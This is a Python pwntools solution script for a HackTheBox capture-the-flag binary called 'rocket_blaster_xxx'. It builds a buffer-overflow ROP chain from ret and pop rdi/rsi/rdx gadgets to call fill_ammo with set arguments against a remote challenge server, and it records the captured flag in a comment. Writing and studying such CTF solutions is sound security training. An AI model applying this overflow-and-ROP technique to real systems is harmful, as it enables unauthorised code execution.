#!/usr/bin/env python3
from pwn import *

exe = './rocket_blaster_xxx'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#p=process()
p=remote('94.237.59.102',42940)

padding = 40

ret = 0x000000000040101a
pop_rdi = 0x000000000040159f
pop_rsi = 0x000000000040159d
pop_rdx = 0x000000000040159b
param1 = 0xdeadbeef
param2 = 0xdeadbabe
param3 = 0xdead1337
payload = flat(
    asm('nop')*padding,
    ret,
    pop_rdi,
    param1,
    pop_rsi,
    param2,
    pop_rdx,
    param3,
    elf.symbols.fill_ammo,
    0x0,
)
p.sendlineafter(b'>> ',payload)
p.interactive()
#flag : HTB{b00m_b00m_r0ck3t_2_th3_m00n}
